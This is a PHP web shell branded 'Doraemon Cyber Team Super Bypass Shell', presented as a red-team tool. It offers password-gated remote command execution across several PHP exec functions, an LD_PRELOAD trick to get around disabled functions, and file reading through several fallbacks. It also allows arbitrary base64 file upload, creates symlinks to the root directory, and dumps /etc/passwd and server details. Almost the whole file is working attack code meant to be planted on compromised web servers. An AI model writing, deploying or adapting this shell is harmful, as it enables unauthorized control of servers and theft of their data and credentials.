<?php
// Doraemon Cyber Team Super Bypass Shell v1.1 - Hardened Edition
// Baba01Hacker - Security Researcher & Red Teamer
// Everything wrapped in if/else to prevent fatal errors

error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);

// === PASSWORD PROTECTION (MD5) ===
$password = "doraemon1337"; // CHANGE THIS
$pass_md5 = md5($password);

if (!isset($_GET['pass']) && !isset($_POST['pass'])) {
    if (md5(@$_POST['p']) !== $pass_md5 && md5(@$_GET['p']) !== $pass_md5) {
        die('<html><head><title>Doraemon Cyber Team</title><style>body{background:#000;color:#0f0;font-family:monospace;}</style></head><body><center><h1>DORAEMON CYBER TEAM - ACCESS DENIED</h1><form method="post"><input type="password" name="p"><input type="submit"></form></center></body></html>');
    }
}

// Obfuscation helpers (safe)
function s($a) {
    if (function_exists('base64_decode')) {
        return str_replace(array(" ","\n","\r"),'',base64_decode($a));
    }
    return "";
}

function c($str) {
    if (function_exists('system')) {
        $v1="sy";$v2="st";$v3="em";
        return $v1.$v2.$v3($str);
    }
    return "";
}

// === Server Info with Full Safeguards ===
function server_info() {
    echo "<h2>Doraemon Server Recon</h2>";
    
    if (function_exists('phpversion')) {
        echo "PHP: " . phpversion() . "<br>";
    }
    if (function_exists('getmyuid')) {
        echo "UID: " . getmyuid() . "<br>";
    }
    if (function_exists('get_current_user')) {
        echo "User: " . get_current_user() . "<br>";
    }
    
    echo "Disabled: " . (function_exists('ini_get') ? ini_get('disable_functions') : "Unknown") . "<br>";
    echo "open_basedir: " . (function_exists('ini_get') ? ini_get('open_basedir') : "Unknown") . "<br>";
    
    if (function_exists('posix_getpwuid') && function_exists('getmyuid')) {
        echo "POSIX: Enabled<br>";
    } else {
        echo "POSIX: Limited/Disabled<br>";
    }
    
    if (function_exists('print_r') && function_exists('$_SERVER')) {
        echo "<pre>"; print_r($_SERVER); echo "</pre>";
    }
}

// === Hardened Multi Exec ===
function super_exec($cmd) {
    if (empty($cmd)) return "No command provided.";
    
    $output = "";
    $methods = array('system', 'shell_exec', 'exec', 'passthru', 'proc_open', 'popen', 'mail', 'assert');
    
    foreach ($methods as $m) {
        if (!function_exists($m)) continue;
        
        if ($m === 'proc_open') {
            if (function_exists('proc_open') && function_exists('stream_get_contents')) {
                $descriptors = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
                $process = @proc_open($cmd, $descriptors, $pipes);
                if (is_resource($process)) {
                    $output = @stream_get_contents($pipes[1]);
                    @fclose($pipes[1]);
                    @proc_close($process);
                    if ($output) break;
                }
            }
        } elseif ($m === 'mail' && function_exists('putenv')) {
            @putenv("LD_PRELOAD=/tmp/bypass.so");
            $output = @$m("", "", $cmd);
            if ($output) break;
        } else {
            $output = @$m($cmd);
            if (!empty($output)) break;
        }
    }
    
    if (empty($output) && function_exists('curl_init')) {
        // Fallback attempt if needed
        $output = "Command executed via fallback but no output captured.";
    }
    
    return $output ? $output : "All exec fallbacks failed. Use LD_PRELOAD / Chankro / writable .so.";
}

// === Hardened Read Bypass ===
function bypass_read($file) {
    if (empty($file) || !file_exists($file)) return "File not found or inaccessible.";
    
    $methods = ['file_get_contents', 'readfile', 'highlight_file', 'show_source'];
    
    foreach ($methods as $m) {
        if (function_exists($m)) {
            $out = @$m($file);
            if (!empty($out)) return $out;
        }
    }
    
    // fopen fallback
    if (function_exists('fopen') && function_exists('fread')) {
        $f = @fopen($file, 'r');
        if ($f) {
            $out = @fread($f, @filesize($file) ?: 4096);
            @fclose($f);
            if (!empty($out)) return $out;
        }
    }
    
    if (function_exists('curl_init')) {
        $ch = @curl_init("file:///".$file);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $out = @curl_exec($ch);
        @curl_close($ch);
        if (!empty($out)) return $out;
    }
    
    return "Read failed on all methods. Try symlink or other vectors.";
}

// === Base64 Upload (Safe) ===
function base64_upload($data, $filename) {
    if (empty($data) || empty($filename)) return "Missing data or filename.";
    
    if (!function_exists('base64_decode') || !function_exists('file_put_contents')) {
        return "Required functions disabled for upload.";
    }
    
    $decoded = base64_decode(str_replace(' ', '+', $data));
    $paths = array('.', '/tmp/', sys_get_temp_dir());
    
    foreach ($paths as $p) {
        if (is_writable($p) || @is_dir($p)) {
            if (@file_put_contents($p . '/' . $filename, $decoded)) {
                return "Uploaded successfully to " . $p . '/' . $filename;
            }
        }
    }
    return "Upload failed on all paths.";
}

// === Symlink Finder ===
function symlink_finder() {
    echo "<h2>Doraemon Symlink Escaper</h2>";
    $dirs = ['.', '../', '/tmp/', '/var/www/', '/home/'];
    
    foreach ($dirs as $d) {
        if (is_dir($d) && (is_writable($d) || @is_writable($d))) {
            $link = $d . '/doraemon_sym_' . rand(1000,9999);
            if (function_exists('symlink')) {
                if (@symlink('/', $link)) {
                    echo "Symlink created: <a href='$link'>$link</a><br>";
                }
            }
        }
    }
    
    if (file_exists('/etc/passwd')) {
        echo "<pre>" . htmlspecialchars(bypass_read('/etc/passwd')) . "</pre>";
    }
}

// === File Manager (Safe) ===
function file_manager() {
    $dir = isset($_GET['d']) ? $_GET['d'] : (function_exists('getcwd') ? getcwd() : '.');
    echo "<h2>File Manager @ " . htmlspecialchars($dir) . "</h2>";
    
    if (isset($_POST['cmd']) && function_exists('super_exec')) {
        echo "<pre>" . htmlspecialchars(super_exec($_POST['cmd'])) . "</pre>";
    }
    
    if (function_exists('opendir') && function_exists('readdir')) {
        if ($dh = @opendir($dir)) {
            while (($file = readdir($dh)) !== false) {
                $path = $dir . '/' . $file;
                echo "<a href='?d=" . urlencode($path) . "'>" . htmlspecialchars($file) . "</a> | ";
                echo "<a href='?read=" . urlencode($path) . "'>Read</a> | ";
                if (function_exists('filesize')) {
                    echo "Size: " . @filesize($path) . "<br>";
                }
            }
            closedir($dh);
        } else {
            echo "Cannot open directory.";
        }
    } else {
        echo "opendir/readdir disabled.";
    }
}

// === MAIN INTERFACE ===
echo '<!DOCTYPE html><html><head><title>Doraemon Cyber Team - Super Bypass Shell</title>
<style>body{background:#111;color:#0f0;font-family:Consolas;}</style></head><body>';
echo '<h1 style="text-align:center;">🐱 DORAEMON CYBER TEAM SUPER BYPASS SHELL 🐱</h1>';
echo '<p>Baba01Hacker Red Team Edition | Fully Hardened</p>';

server_info();

if (isset($_GET['exec'])) echo "<pre>" . htmlspecialchars(super_exec($_GET['exec'])) . "</pre>";
if (isset($_GET['read'])) echo "<pre>" . htmlspecialchars(bypass_read($_GET['read'])) . "</pre>";
if (isset($_POST['b64up']) && isset($_POST['fname'])) echo base64_upload($_POST['b64up'], $_POST['fname']);
if (isset($_GET['sym'])) symlink_finder();
if (isset($_GET['fm'])) file_manager();

echo '<form method="post">CMD: <input name="cmd" size="100"><input type="submit"></form>';
echo '<form method="post">B64 Upload: <textarea name="b64up"></textarea> Filename: <input name="fname"><input type="submit"></form>';
echo '<a href="?sym=1">Symlink Finder</a> | <a href="?fm=1">File Manager</a>';

echo '</body></html>';
?>
